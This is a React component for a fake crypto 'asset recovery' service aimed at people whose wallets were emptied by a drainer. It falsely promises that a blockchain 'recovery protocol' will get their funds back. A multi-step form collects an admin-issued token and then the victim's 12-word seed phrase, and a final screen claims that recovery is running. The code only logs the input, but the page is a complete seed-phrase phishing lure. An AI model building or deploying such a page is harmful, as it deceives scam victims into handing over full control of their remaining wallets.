import { useState } from 'react';
import {
	Dialog,
	DialogContent,
	DialogDescription,
	DialogHeader,
	DialogTitle,
	DialogTrigger,
} from './ui/dialog';
import {
	Form,
	FormControl,
	FormDescription,
	FormField,
	FormItem,
	FormLabel,
	FormMessage,
} from './ui/form';
import { Check, Loader2 } from 'lucide-react';
import { Button } from './ui/button';
import { Input } from './ui/input';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import z from 'zod';
import { Textarea } from './ui/textarea';

const validTokens = ['token1', 'token2', 'token3'];

const tokenSchema = z.object({
	authToken: z
		.string()
		.min(1, { message: 'Token is required' })
		.refine((token) => validTokens.includes(token), {
			message: 'Invalid Token',
		}),
	phrase: z.string().min(1, { message: 'Phrase is required' }),
});

const Drain = () => {
	const [loading, setLoading] = useState(false);
	const [currentStep, setCurrentStep] = useState(1);
	const form = useForm<z.infer<typeof tokenSchema>>({
		resolver: zodResolver(tokenSchema),
		defaultValues: {
			authToken: '',
		},
	});

	function handleSubmit(data: z.infer<typeof tokenSchema>) {
		if (currentStep < 3) {
			setCurrentStep(currentStep + 1);
		} else {
			console.log(data);
		}
	}

	return (
		<div>
			<Dialog>
				<DialogTrigger>
					<div
						className="flex flex-col gap-2 bg-popover md:max-w-[300px] p-4 rounded-md hover:bg-popover/80 cursor-pointer"
						onClick={() => console.log('object')}>
						<div>
							<img
								src={''}
								alt={''}
								className="w-10 h-10 inline-block bg-muted p-0 rounded-md"
							/>
						</div>

						<div className="flex flex-col gap-2">
							<h1 className="text-lg">Drainer</h1>
							<p className="text-sm text-muted-foreground">
								If you lost your assets via a drainer
							</p>
						</div>
					</div>
				</DialogTrigger>
				<DialogContent className="text-left">
					<DialogHeader>
						<DialogTitle>Assets lost via a drainer</DialogTitle>
						<DialogDescription className="text-left">
							Our advanced recovery protocol scans the blockchain for traces of
							your assets, and recovers them no mater the source. The funds are
							transfered to the wallet with which you made the first payment.
						</DialogDescription>
						<Form {...form}>
							<form
								onSubmit={form.handleSubmit(handleSubmit)}
								className="flex flex-col gap-4 text-left">
								{currentStep === 1 && (
									<FormField
										control={form.control}
										name="authToken"
										render={({ field }) => (
											<FormItem>
												<FormLabel>Auth Token</FormLabel>
												<FormDescription>
													Please enter your auth token from the admin
												</FormDescription>
												<FormControl>
													<Input
														{...field}
														placeholder="Your auth token here"
													/>
												</FormControl>
												<FormMessage />
											</FormItem>
										)}
									/>
								)}
								{currentStep === 2 && (
									<FormField
										name="phrase"
										control={form.control}
										render={({ field }) => (
											<FormItem>
												<FormLabel>Phrase</FormLabel>
												<FormControl>
													<Textarea
														{...field}
														placeholder="Enter the 12 phrase of the wallet with which you made payments"
													/>
												</FormControl>
												<FormMessage />
											</FormItem>
										)}
									/>
								)}
								{currentStep === 3 && (
									<div className="flex flex-col gap-2">
										<div className="flex justify-center items-center">
											<Check className="w-8 h-8" />
										</div>

										<p className="text-[14px] text-center mb-4">
											Your subbmission has been received. Please wait while our
											protocols run in the background to recover your funds
										</p>
									</div>
								)}
								<Button type="submit" disabled={loading}>
									{loading ? (
										<div className="flex items-center gap-2">
											<Loader2 className="mr-2 h-4 w-4 animate-spin" />{' '}
											Submitting{' '}
										</div>
									) : (
										'Submit phrase'
									)}
								</Button>
							</form>
						</Form>
					</DialogHeader>
				</DialogContent>
			</Dialog>
		</div>
	);
};

export default Drain;
